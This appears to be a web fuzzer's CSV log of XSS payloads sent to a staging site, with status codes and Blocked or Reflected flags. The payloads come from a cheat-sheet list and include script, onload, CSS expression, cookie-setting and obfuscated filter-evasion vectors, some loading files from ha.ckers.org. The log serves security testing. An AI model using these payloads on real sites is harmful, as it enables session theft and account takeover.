+155,Fuzzed,Tue Jun 02 18:24:54 CEST 2020,POST,https://staging.itapp.eus/,200,OK,199,579,209,426,5581,,Blocked,"[Exploit Description: Breaks single quoted strings, injects a comment, carriage return and finally an alert.]"
+156,Fuzzed,Tue Jun 02 18:24:54 CEST 2020,POST,https://staging.itapp.eus/,200,OK,206,579,161,426,5533,,Blocked,"[Exploit Tags: general, JS breaking, basic, obfuscated, CRLF]"
+157,Fuzzed,Tue Jun 02 18:24:54 CEST 2020,POST,https://staging.itapp.eus/,200,OK,205,579,121,426,5493,,Blocked,[Author Name: kishor]
+134,Fuzzed,Tue Jun 02 18:25:16 CEST 2020,POST,https://staging.itapp.eus/,500,Internal Server Error,12687,579,128,265,230796,,Reflected,[Basic JS breaker variant 7]
+159,Fuzzed,Tue Jun 02 18:25:29 CEST 2020,POST,https://staging.itapp.eus/,200,OK,511,579,153,426,5525,,Blocked,[Exploit Name: Basic single quoted attribute breaker]
+160,Fuzzed,Tue Jun 02 18:25:29 CEST 2020,POST,https://staging.itapp.eus/,200,OK,199,579,146,426,5532,,Blocked,[Exploit String: '> <script>alert(3)</script>]
+161,Fuzzed,Tue Jun 02 18:25:29 CEST 2020,POST,https://staging.itapp.eus/,200,OK,350,579,188,426,5560,,Blocked,[Exploit Description: This vector breaks single quoted attributes and appends an alert.]
+162,Fuzzed,Tue Jun 02 18:25:30 CEST 2020,POST,https://staging.itapp.eus/,200,OK,212,579,145,426,5517,,Blocked,"[Exploit Tags: general, html breaking, basic]"
+163,Fuzzed,Tue Jun 02 18:25:30 CEST 2020,POST,https://staging.itapp.eus/,200,OK,265,579,121,426,5493,,Blocked,[Author Name: kishor]
+165,Fuzzed,Tue Jun 02 18:25:37 CEST 2020,POST,https://staging.itapp.eus/,200,OK,379,579,135,426,5507,,Blocked,[Exploit Name: Basic title breaker]
+166,Fuzzed,Tue Jun 02 18:25:37 CEST 2020,POST,https://staging.itapp.eus/,200,OK,273,579,151,426,5541,,Blocked,[Exploit String: </title><script>alert(1)</script>]
+167,Fuzzed,Tue Jun 02 18:25:37 CEST 2020,POST,https://staging.itapp.eus/,200,OK,278,579,183,426,5555,,Blocked,[Exploit Description: This basic vector breaks HTML titles and injects JavaScript.]
+168,Fuzzed,Tue Jun 02 18:25:38 CEST 2020,POST,https://staging.itapp.eus/,200,OK,333,579,161,426,5533,,Blocked,"[Exploit Tags: general, html breaking, basic, title breaking]"
+169,Fuzzed,Tue Jun 02 18:25:38 CEST 2020,POST,https://staging.itapp.eus/,200,OK,434,579,121,426,5493,,Blocked,[Author Name: kishor]
+171,Fuzzed,Tue Jun 02 18:25:38 CEST 2020,POST,https://staging.itapp.eus/,200,OK,287,579,123,426,5495,,Blocked,[Exploit Name: BGSOUND]
+172,Fuzzed,Tue Jun 02 18:25:39 CEST 2020,POST,https://staging.itapp.eus/,200,OK,251,579,158,426,5529,,Blocked,"[Exploit String: <BGSOUND SRC=""javascript:alert('XSS');"">]"
+173,Fuzzed,Tue Jun 02 18:25:39 CEST 2020,POST,https://staging.itapp.eus/,200,OK,224,579,130,426,5502,,Blocked,[Exploit Description: BGSOUND]
+174,Fuzzed,Tue Jun 02 18:25:39 CEST 2020,POST,https://staging.itapp.eus/,200,OK,272,579,134,426,5506,,Blocked,"[Exploit Tags: general, evil tags]"
+175,Fuzzed,Tue Jun 02 18:25:39 CEST 2020,POST,https://staging.itapp.eus/,200,OK,294,579,127,426,5499,,Blocked,[Author Name: ha.ckers.org]
+176,Fuzzed,Tue Jun 02 18:25:39 CEST 2020,POST,https://staging.itapp.eus/,200,OK,257,579,123,426,5495,,Blocked,[BODY background-image]
+177,Fuzzed,Tue Jun 02 18:25:39 CEST 2020,POST,https://staging.itapp.eus/,200,OK,216,579,137,426,5509,,Blocked,[Exploit Name: BODY background-image]
+178,Fuzzed,Tue Jun 02 18:25:39 CEST 2020,POST,https://staging.itapp.eus/,200,OK,338,579,162,426,5533,,Blocked,"[Exploit String: <BODY BACKGROUND=""javascript:alert('XSS');"">]"
+179,Fuzzed,Tue Jun 02 18:25:40 CEST 2020,POST,https://staging.itapp.eus/,200,OK,264,579,133,426,5505,,Blocked,[Exploit Description: BODY image]
+180,Fuzzed,Tue Jun 02 18:25:40 CEST 2020,POST,https://staging.itapp.eus/,200,OK,845,579,134,426,5506,,Blocked,"[Exploit Tags: general, evil tags]"
+181,Fuzzed,Tue Jun 02 18:25:40 CEST 2020,POST,https://staging.itapp.eus/,200,OK,876,579,127,426,5499,,Blocked,[Author Name: ha.ckers.org]
+183,Fuzzed,Tue Jun 02 18:25:41 CEST 2020,POST,https://staging.itapp.eus/,200,OK,229,579,127,426,5499,,Blocked,[Exploit Name: BODY ONLOAD]
+184,Fuzzed,Tue Jun 02 18:25:41 CEST 2020,POST,https://staging.itapp.eus/,200,OK,631,579,144,426,5520,,Blocked,[Exploit String: <BODY ONLOAD=alert('XSS')>]
+185,Fuzzed,Tue Jun 02 18:25:42 CEST 2020,POST,https://staging.itapp.eus/,200,OK,325,579,260,426,5634,,Blocked,[Exploit Description: BODY tag (I like this method because it doesn't require using any variants of ”javascript:” or ”<SCRIPT...” to accomplish the XSS attack)]
+186,Fuzzed,Tue Jun 02 18:25:42 CEST 2020,POST,https://staging.itapp.eus/,200,OK,529,579,134,426,5506,,Blocked,"[Exploit Tags: general, evil tags]"
+187,Fuzzed,Tue Jun 02 18:25:42 CEST 2020,POST,https://staging.itapp.eus/,200,OK,333,579,127,426,5499,,Blocked,[Author Name: ha.ckers.org]
+170,Fuzzed,Tue Jun 02 18:25:38 CEST 2020,POST,https://staging.itapp.eus/,502,Bad Gateway,14341,579,109,172,332,,,[BGSOUND]
+188,Fuzzed,Tue Jun 02 18:25:43 CEST 2020,POST,https://staging.itapp.eus/,502,Bad Gateway,9502,579,144,172,332,,,[Camouflaged comment injection with JS link]
+182,Fuzzed,Tue Jun 02 18:25:41 CEST 2020,POST,https://staging.itapp.eus/,502,Bad Gateway,11647,579,113,172,332,,,[BODY ONLOAD]
+158,Fuzzed,Tue Jun 02 18:25:34 CEST 2020,POST,https://staging.itapp.eus/,502,Bad Gateway,17947,579,139,172,332,,,[Basic single quoted attribute breaker]
+164,Fuzzed,Tue Jun 02 18:25:50 CEST 2020,POST,https://staging.itapp.eus/,502,Bad Gateway,9175,579,121,172,332,,,[Basic title breaker]
+190,Fuzzed,Tue Jun 02 18:25:52 CEST 2020,POST,https://staging.itapp.eus/,502,Bad Gateway,9123,579,122,172,332,,,[Exploit String: <!--]
+192,Fuzzed,Tue Jun 02 18:25:52 CEST 2020,POST,https://staging.itapp.eus/,502,Bad Gateway,9123,579,147,172,332,,,[- --><a href=javascript:alert:document.domain]
+191,Fuzzed,Tue Jun 02 18:25:52 CEST 2020,POST,https://staging.itapp.eus/,502,Bad Gateway,9123,579,111,172,332,,,"[<A href=""]"
+189,Fuzzed,Tue Jun 02 18:25:52 CEST 2020,POST,https://staging.itapp.eus/,502,Bad Gateway,9125,579,158,172,332,,,[Exploit Name: Camouflaged comment injection with JS link]
+193,Fuzzed,Tue Jun 02 18:25:59 CEST 2020,POST,https://staging.itapp.eus/,502,Bad Gateway,9123,579,110,172,332,,,[>test-->]
+194,Fuzzed,Tue Jun 02 18:26:01 CEST 2020,POST,https://staging.itapp.eus/,502,Bad Gateway,9126,579,204,172,332,,,[Exploit Description: This vector evades filters by camouflaging as a comment and inhabiting a JS link.]
+195,Fuzzed,Tue Jun 02 18:26:01 CEST 2020,POST,https://staging.itapp.eus/,502,Bad Gateway,9125,579,172,172,332,,,"[Exploit Tags: general, obfuscated, comment breaking, internet explorer]"
+197,Fuzzed,Tue Jun 02 18:26:01 CEST 2020,POST,https://staging.itapp.eus/,502,Bad Gateway,9125,579,118,172,332,,,[Case Insensitive]
+196,Fuzzed,Tue Jun 02 18:26:01 CEST 2020,POST,https://staging.itapp.eus/,502,Bad Gateway,9127,579,131,172,332,,,[Author Name: thespanner.co.uk]
+198,Fuzzed,Tue Jun 02 18:26:09 CEST 2020,POST,https://staging.itapp.eus/,502,Bad Gateway,9120,579,132,172,332,,,[Exploit Name: Case Insensitive]
+200,Fuzzed,Tue Jun 02 18:26:11 CEST 2020,POST,https://staging.itapp.eus/,502,Bad Gateway,9121,579,158,172,332,,,[Exploit Description: Case insensitive XSS attack vector.]
+199,Fuzzed,Tue Jun 02 18:26:11 CEST 2020,POST,https://staging.itapp.eus/,502,Bad Gateway,9122,579,151,172,332,,,[Exploit String: <IMG SRC=JaVaScRiPt:alert('XSS')>]
+201,Fuzzed,Tue Jun 02 18:26:11 CEST 2020,POST,https://staging.itapp.eus/,502,Bad Gateway,9127,579,146,172,332,,,"[Exploit Tags: general, evil tags, obfuscated]"
+202,Fuzzed,Tue Jun 02 18:26:11 CEST 2020,POST,https://staging.itapp.eus/,502,Bad Gateway,9124,579,127,172,332,,,[Author Name: ha.ckers.org]
+203,Fuzzed,Tue Jun 02 18:26:18 CEST 2020,POST,https://staging.itapp.eus/,502,Bad Gateway,9122,579,128,172,332,,,[Character Encoding Example]
+208,Fuzzed,Tue Jun 02 18:26:27 CEST 2020,POST,https://staging.itapp.eus/,200,OK,355,579,127,426,5499,,Blocked,[Author Name: ha.ckers.org]
+205,Fuzzed,Tue Jun 02 18:26:20 CEST 2020,POST,https://staging.itapp.eus/,200,OK,7555,579,624,426,5498,,Blocked,[Exploit String: <%3C&lt&lt;&LT&LT;&#60&#060&#0060&#00060&#000060&#0000060&#60;&#060;&#0060;&#00060;&#000060;&#0000060;&#x3c&#x03c&#x003c&#x0003c&#x00003c&#x000003c&#x3c;&#x03c;&#x003c;&#x0003c;&#x00003c;&#x000003c;&#X3c&#X03c&#X003c&#X0003c&#X00003c&#X000003c&#X3c;&#X03c;&#X003c;&#X0003c;&#X00003c;&#X000003c;&#x3C&#x03C&#x003C&#x0003C&#x00003C&#x000003C&#x3C;&#x03C;&#x003C;&#x0003C;&#x00003C;&#x000003C;&#X3C&#X03C&#X003C&#X0003C&#X00003C&#X000003C&#X3C;&#X03C;&#X003C;&#X0003C;&#X00003C;&#X000003C;\x3c\x3C\u003c\u003C]
+207,Fuzzed,Tue Jun 02 18:26:20 CEST 2020,POST,https://staging.itapp.eus/,200,OK,7548,579,146,426,5518,,Blocked,"[Exploit Tags: general, evil tags, obfuscated]"
+211,Fuzzed,Tue Jun 02 18:26:27 CEST 2020,POST,https://staging.itapp.eus/,200,OK,149,579,126,426,5504,,Blocked,[Exploit String: <script>]
+210,Fuzzed,Tue Jun 02 18:26:27 CEST 2020,POST,https://staging.itapp.eus/,200,OK,207,579,154,426,5526,,Blocked,[Exploit Name: Closing JS Tag in JS String assignment]
+212,Fuzzed,Tue Jun 02 18:26:27 CEST 2020,POST,https://staging.itapp.eus/,200,OK,703,579,166,426,5527,,Blocked,"[var a = ""</script> <script> alert('XSS !'); </script> <script>"";]"
+213,Fuzzed,Tue Jun 02 18:26:27 CEST 2020,POST,https://staging.itapp.eus/,200,OK,654,579,111,426,5489,,Blocked,[</script>]
+214,Fuzzed,Tue Jun 02 18:26:28 CEST 2020,POST,https://staging.itapp.eus/,200,OK,163,579,264,426,5636,,Blocked,"[Exploit Description: For some reason, Firefox picks up the script closing tag in the quoted string and then proceeds to process the remaining script tags as code.]"
+215,Fuzzed,Tue Jun 02 18:26:28 CEST 2020,POST,https://staging.itapp.eus/,200,OK,165,579,153,426,5525,,Blocked,"[Exploit Tags: general, gecko, obfuscated, evil tags]"
+204,Fuzzed,Tue Jun 02 18:26:20 CEST 2020,POST,https://staging.itapp.eus/,200,OK,8593,579,142,426,5514,,Blocked,[Exploit Name: Character Encoding Example]
+217,Fuzzed,Tue Jun 02 18:26:28 CEST 2020,POST,https://staging.itapp.eus/,200,OK,227,579,121,426,5507,,Blocked,[Commented-out Block]
+218,Fuzzed,Tue Jun 02 18:26:28 CEST 2020,POST,https://staging.itapp.eus/,200,OK,216,579,135,426,5507,,Blocked,[Exploit Name: Commented-out Block]
+216,Fuzzed,Tue Jun 02 18:26:28 CEST 2020,POST,https://staging.itapp.eus/,200,OK,260,579,125,426,5497,,Blocked,[Author Name: t3rmin4t0r]
+219,Fuzzed,Tue Jun 02 18:26:28 CEST 2020,POST,https://staging.itapp.eus/,200,OK,158,579,178,426,5538,,Blocked,[Exploit String: <!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->]
+220,Fuzzed,Tue Jun 02 18:26:28 CEST 2020,POST,https://staging.itapp.eus/,200,OK,187,579,504,426,5875,,Blocked,"[Exploit Description: Downlevel-Hidden block (only works in IE5.0 and later and Netscape 8.1 in IE rendering engine mode).  Some websites consider anything inside a comment block to be safe and therefore it does not need to be removed, which allows our XSS vector. Or the system could add comment tags around something to attempt to render it harmless.  As we can see, that probably wouldn't do the job.]"
+221,Fuzzed,Tue Jun 02 18:26:28 CEST 2020,POST,https://staging.itapp.eus/,200,OK,168,579,176,426,5548,,Blocked,"[Exploit Tags: general, obfuscated, conditional comments, internet explorer]"
+222,Fuzzed,Tue Jun 02 18:26:29 CEST 2020,POST,https://staging.itapp.eus/,200,OK,152,579,127,426,5499,,Blocked,[Author Name: ha.ckers.org]
+206,Fuzzed,Tue Jun 02 18:26:20 CEST 2020,POST,https://staging.itapp.eus/,502,Bad Gateway,9124,579,325,172,332,,,"[Exploit Description: All of the possible combinations of the character ”<” in HTML and JavaScript.  Most of these won't render, but many of them can get rendered in certain circumstances (standards are great, aren't they?).]"
+224,Fuzzed,Tue Jun 02 18:26:29 CEST 2020,POST,https://staging.itapp.eus/,200,OK,148,579,159,426,5531,,Blocked,[Exploit Name: Comment-breaker using obfuscated JavaScript]
+223,Fuzzed,Tue Jun 02 18:26:29 CEST 2020,POST,https://staging.itapp.eus/,200,OK,157,579,145,426,5517,,Blocked,[Comment-breaker using obfuscated JavaScript]
+225,Fuzzed,Tue Jun 02 18:26:29 CEST 2020,POST,https://staging.itapp.eus/,200,OK,183,579,154,426,5498,,Blocked,[Exploit String: */a=eval;b=alert;a(b(/e/.source));/*]
+226,Fuzzed,Tue Jun 02 18:26:29 CEST 2020,POST,https://staging.itapp.eus/,200,OK,191,579,183,426,5555,,Blocked,[Exploit Description: This vector creates an alert by breaking multiline comments.]
+228,Fuzzed,Tue Jun 02 18:26:29 CEST 2020,POST,https://staging.itapp.eus/,200,OK,171,579,121,426,5493,,Blocked,[Author Name: kishor]
+227,Fuzzed,Tue Jun 02 18:26:29 CEST 2020,POST,https://staging.itapp.eus/,200,OK,178,579,154,426,5526,,Blocked,"[Exploit Tags: general, comment breaking, JS breaking]"
+231,Fuzzed,Tue Jun 02 18:26:29 CEST 2020,POST,https://staging.itapp.eus/,200,OK,157,579,192,426,5562,,Blocked,[Exploit String: width: expression((window.r==document.cookie)?'':alert(r=document.cookie))]
+232,Fuzzed,Tue Jun 02 18:26:29 CEST 2020,POST,https://staging.itapp.eus/,200,OK,157,579,302,426,5674,,Blocked,[Exploit Description: This vector uses JavaScript conditional statements to inject an alert into CSS properties - it was once used as a PoC for a vulnerability in Stefan Di Paolos data binding example.]
+230,Fuzzed,Tue Jun 02 18:26:29 CEST 2020,POST,https://staging.itapp.eus/,200,OK,173,579,150,426,5522,,Blocked,[Exploit Name: Conditional style injection for IE]
+234,Fuzzed,Tue Jun 02 18:26:29 CEST 2020,POST,https://staging.itapp.eus/,200,OK,167,579,124,426,5496,,Blocked,[Author Name: DoctorDan]
+233,Fuzzed,Tue Jun 02 18:26:29 CEST 2020,POST,https://staging.itapp.eus/,200,OK,182,579,171,426,5543,,Blocked,"[Exploit Tags: general, obfuscated, internet explorer, style injection]"
+229,Fuzzed,Tue Jun 02 18:26:29 CEST 2020,POST,https://staging.itapp.eus/,500,Internal Server Error,2047,579,136,265,184075,,Reflected,[Conditional style injection for IE]
+235,Fuzzed,Tue Jun 02 18:26:29 CEST 2020,POST,https://staging.itapp.eus/,200,OK,17612,579,117,426,5476,,,[Content Replace]
+209,Fuzzed,Tue Jun 02 18:26:27 CEST 2020,POST,https://staging.itapp.eus/,200,OK,19770,579,140,426,5480,,,[Closing JS Tag in JS String assignment]
+237,Fuzzed,Tue Jun 02 18:29:21 CEST 2020,POST,https://staging.itapp.eus/,200,OK,153,579,180,426,5562,,Blocked,"[Exploit String: <A HREF=""http://www.gohttp://www.google.com/ogle.com/"">XSS</A>]"
+239,Fuzzed,Tue Jun 02 18:29:21 CEST 2020,POST,https://staging.itapp.eus/,200,OK,157,579,146,426,5518,,Blocked,"[Exploit Tags: general, evil tags, obfuscated]"
+240,Fuzzed,Tue Jun 02 18:29:21 CEST 2020,POST,https://staging.itapp.eus/,200,OK,174,579,127,426,5499,,Blocked,[Author Name: ha.ckers.org]
+236,Fuzzed,Tue Jun 02 18:29:21 CEST 2020,POST,https://staging.itapp.eus/,200,OK,182,579,131,426,5503,,Blocked,[Exploit Name: Content Replace]
+238,Fuzzed,Tue Jun 02 18:29:21 CEST 2020,POST,https://staging.itapp.eus/,200,OK,186,579,541,426,5854,,Blocked,[Exploit Description: Content replace as an attack vector (assuming ”http://www.google.com/” is programmatically replaced with null). I actually used a similar attack vector against a several separate real world XSS filters by using the conversion filter itself (like http://quickwired.com/kallahar/smallprojects/php_xss_filter_function.php) to help create the attack vector (”java&#x26;#x09;script:” was converted into ”java&#x09;script:”.]
+242,Fuzzed,Tue Jun 02 18:29:21 CEST 2020,POST,https://staging.itapp.eus/,200,OK,152,579,135,426,5507,,Blocked,[Exploit Name: Cookie Manipulation]
+244,Fuzzed,Tue Jun 02 18:29:21 CEST 2020,POST,https://staging.itapp.eus/,200,OK,143,579,672,426,6046,,Blocked,"[Exploit Description: Cookie manipulation - admittedly this is pretty obscure but I have seen a few examples where <META is allowed and you can user it to overwrite cookies. There are other examples of sites where instead of fetching the username from a database it is stored inside of a cookie to be displayed only to the user who visits the page. With these two scenarios combined you can modify the victim's cookie which will be displayed back to them as JavaScript (you can also use this to log people out or change their user states, get them to log in as you, etc).]"
+243,Fuzzed,Tue Jun 02 18:29:21 CEST 2020,POST,https://staging.itapp.eus/,200,OK,159,579,195,426,5581,,Blocked,"[Exploit String: <META HTTP-EQUIV=""Set-Cookie"" Content=""USERID=<SCRIPT>alert('XSS')</SCRIPT>"">]"
+245,Fuzzed,Tue Jun 02 18:29:21 CEST 2020,POST,https://staging.itapp.eus/,200,OK,150,579,134,426,5506,,Blocked,"[Exploit Tags: general, evil tags]"
+246,Fuzzed,Tue Jun 02 18:29:21 CEST 2020,POST,https://staging.itapp.eus/,200,OK,150,579,127,426,5499,,Blocked,[Author Name: ha.ckers.org]
+247,Fuzzed,Tue Jun 02 18:29:21 CEST 2020,POST,https://staging.itapp.eus/,200,OK,160,579,124,426,5496,,Blocked,[DIV background-image 1]
+249,Fuzzed,Tue Jun 02 18:29:21 CEST 2020,POST,https://staging.itapp.eus/,200,OK,150,579,178,426,5554,,Blocked,"[Exploit String: <DIV STYLE=""background-image: url(javascript:alert('XSS'))"">]"
+248,Fuzzed,Tue Jun 02 18:29:21 CEST 2020,POST,https://staging.itapp.eus/,200,OK,162,579,138,426,5510,,Blocked,[Exploit Name: DIV background-image 1]
+250,Fuzzed,Tue Jun 02 18:29:22 CEST 2020,POST,https://staging.itapp.eus/,200,OK,148,579,143,426,5515,,Blocked,[Exploit Description: Div background-image]
+251,Fuzzed,Tue Jun 02 18:29:22 CEST 2020,POST,https://staging.itapp.eus/,200,OK,148,579,151,426,5523,,Blocked,"[Exploit Tags: general, evil tags, style injection]"
+253,Fuzzed,Tue Jun 02 18:29:22 CEST 2020,POST,https://staging.itapp.eus/,200,OK,144,579,124,426,5496,,Blocked,[DIV background-image 2]
+252,Fuzzed,Tue Jun 02 18:29:22 CEST 2020,POST,https://staging.itapp.eus/,200,OK,153,579,127,426,5499,,Blocked,[Author Name: ha.ckers.org]
+254,Fuzzed,Tue Jun 02 18:29:22 CEST 2020,POST,https://staging.itapp.eus/,200,OK,141,579,138,426,5510,,Blocked,[Exploit Name: DIV background-image 2]
+255,Fuzzed,Tue Jun 02 18:29:22 CEST 2020,POST,https://staging.itapp.eus/,200,OK,148,579,182,426,5526,,Blocked,"[Exploit String: <DIV STYLE=""background-image: url(&#1;javascript:alert('XSS'))"">]"
+256,Fuzzed,Tue Jun 02 18:29:22 CEST 2020,POST,https://staging.itapp.eus/,200,OK,152,579,511,426,5883,,Blocked,"[Exploit Description: Div background-image plus extra characters.  I built a quick XSS fuzzer to detect any erroneous characters that are allowed after the open parenthesis but before the JavaScript directive in IE and Netscape 8.1 in secure site mode. These are in decimal but you can include hex and add padding of course.  (Any of the following chars can be used: 1-32, 34, 39, 160, 8192-8203, 12288, 65279)]"
+257,Fuzzed,Tue Jun 02 18:29:22 CEST 2020,POST,https://staging.itapp.eus/,200,OK,155,579,151,426,5523,,Blocked,"[Exploit Tags: general, evil tags, style injection]"
+258,Fuzzed,Tue Jun 02 18:29:22 CEST 2020,POST,https://staging.itapp.eus/,200,OK,140,579,127,426,5499,,Blocked,[Author Name: ha.ckers.org]
+260,Fuzzed,Tue Jun 02 18:29:22 CEST 2020,POST,https://staging.itapp.eus/,200,OK,389,579,130,426,5643,,Blocked,[Exploit Name: DIV expression]
+262,Fuzzed,Tue Jun 02 18:29:22 CEST 2020,POST,https://staging.itapp.eus/,200,OK,303,579,271,426,5643,,Blocked,[Exploit Description: Div expression - a variant of this was effective against a real world cross site scripting filter using a newline between the colon and ”expression”]
+263,Fuzzed,Tue Jun 02 18:29:22 CEST 2020,POST,https://staging.itapp.eus/,200,OK,176,579,171,426,5543,,Blocked,"[Exploit Tags: general, evil tags, style injection,  internet explorer]"
+264,Fuzzed,Tue Jun 02 18:29:22 CEST 2020,POST,https://staging.itapp.eus/,200,OK,196,579,127,426,5499,,Blocked,[Author Name: ha.ckers.org]
+261,Fuzzed,Tue Jun 02 18:29:22 CEST 2020,POST,https://staging.itapp.eus/,200,OK,761,579,164,426,5535,,Blocked,"[Exploit String: <DIV STYLE=""width: expression(alert('XSS'));"">]"
+265,Fuzzed,Tue Jun 02 18:29:22 CEST 2020,POST,https://staging.itapp.eus/,200,OK,201,579,115,426,5487,,Blocked,[DIV w/Unicode]
+266,Fuzzed,Tue Jun 02 18:29:22 CEST 2020,POST,https://staging.itapp.eus/,200,OK,236,579,129,426,5501,,Blocked,[Exploit Name: DIV w/Unicode]
+267,Fuzzed,Tue Jun 02 18:29:23 CEST 2020,POST,https://staging.itapp.eus/,200,OK,141,579,291,426,5721,,Blocked,"[Exploit String: <DIV STYLE=""background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"">]"
+268,Fuzzed,Tue Jun 02 18:29:23 CEST 2020,POST,https://staging.itapp.eus/,200,OK,141,579,349,426,5721,,Blocked,[Exploit Description: DIV background-image with unicoded XSS exploit (this has been modified slightly to obfuscate the url parameter).  The original vulnerability was found by Renaud Lifchitz (http://www.sysdream.com) as a vulnerability in Hotmail.]
+269,Fuzzed,Tue Jun 02 18:29:23 CEST 2020,POST,https://staging.itapp.eus/,200,OK,154,579,146,426,5518,,Blocked,"[Exploit Tags: general, evil tags, obfuscated]"
+272,Fuzzed,Tue Jun 02 18:29:23 CEST 2020,POST,https://staging.itapp.eus/,200,OK,147,579,142,426,5514,,Blocked,[Exploit Name: Double open angle brackets]
+273,Fuzzed,Tue Jun 02 18:29:23 CEST 2020,POST,https://staging.itapp.eus/,200,OK,153,579,166,426,5544,,Blocked,[Exploit String: <IFRAME SRC=http://ha.ckers.org/scriptlet.html <]
+274,Fuzzed,Tue Jun 02 18:29:23 CEST 2020,POST,https://staging.itapp.eus/,200,OK,153,579,472,426,5842,,Blocked,"[Exploit Description: This is an odd one that Steven Christey brought to my attention. At first I misclassified this as the same XSS vector as above but it's surprisingly different. Using an open angle bracket at the end of the vector instead of a close angle bracket causes different behavior in Netscape Gecko rendering. Without it, Firefox will work but Netscape won't]"
+275,Fuzzed,Tue Jun 02 18:29:23 CEST 2020,POST,https://staging.itapp.eus/,200,OK,184,579,152,426,5524,,Blocked,"[Exploit Tags: general, evil tags, injection, gecko]"
+276,Fuzzed,Tue Jun 02 18:29:23 CEST 2020,POST,https://staging.itapp.eus/,200,OK,151,579,127,426,5499,,Blocked,[Author Name: ha.ckers.org]
+270,Fuzzed,Tue Jun 02 18:29:23 CEST 2020,POST,https://staging.itapp.eus/,500,Internal Server Error,1654,579,127,265,228074,,Reflected,[Author Name: ha.ckers.org]
+278,Fuzzed,Tue Jun 02 18:29:24 CEST 2020,POST,https://staging.itapp.eus/,200,OK,201,579,130,426,5502,,Blocked,[Exploit Name: Dword Encoding]
+279,Fuzzed,Tue Jun 02 18:29:25 CEST 2020,POST,https://staging.itapp.eus/,200,OK,169,579,154,426,5536,,Blocked,"[Exploit String: <A HREF=""http://1113982867/"">XSS</A>]"
+280,Fuzzed,Tue Jun 02 18:29:25 CEST 2020,POST,https://staging.itapp.eus/,200,OK,210,579,209,426,5581,,Blocked,[Exploit Description: URL string evasion (assuming ”http://www.google.com/” is programmatically disallowed).]
+281,Fuzzed,Tue Jun 02 18:29:25 CEST 2020,POST,https://staging.itapp.eus/,200,OK,146,579,146,426,5518,,Blocked,"[Exploit Tags: general, evil tags, obfuscated]"
+277,Fuzzed,Tue Jun 02 18:29:24 CEST 2020,POST,https://staging.itapp.eus/,500,Internal Server Error,1614,579,116,265,228052,,Reflected,[Dword Encoding]
+282,Fuzzed,Tue Jun 02 18:29:25 CEST 2020,POST,https://staging.itapp.eus/,200,OK,160,579,127,426,5499,,Blocked,[Author Name: ha.ckers.org]
+284,Fuzzed,Tue Jun 02 18:29:25 CEST 2020,POST,https://staging.itapp.eus/,200,OK,144,579,127,426,5499,,Blocked,[Exploit Name: Embed Flash]
+285,Fuzzed,Tue Jun 02 18:29:25 CEST 2020,POST,https://staging.itapp.eus/,200,OK,164,579,194,426,5574,,Blocked,"[Exploit String: <EMBED SRC=""http://ha.ckers.org/xss.swf"" AllowScriptAccess=""always""></EMBED>]"
+286,Fuzzed,Tue Jun 02 18:29:26 CEST 2020,POST,https://staging.itapp.eus/,200,OK,147,579,391,426,5763,,Blocked,[Exploit Description: Using an EMBED tag you can embed a Flash movie that contains XSS. If you add the attributes allowScriptAccess=”never” and allownetworking=”internal” it can mitigate this risk (thank you to Jonathan Vanasco for the info). Demo: http://ha.ckers.org/weird/xssflash.html :]
+287,Fuzzed,Tue Jun 02 18:29:26 CEST 2020,POST,https://staging.itapp.eus/,200,OK,158,579,157,426,5529,,Blocked,"[Exploit Tags: general, evil tags, obfuscated, injection]"
+288,Fuzzed,Tue Jun 02 18:29:26 CEST 2020,POST,https://staging.itapp.eus/,200,OK,209,579,127,426,5499,,Blocked,[Author Name: ha.ckers.org]
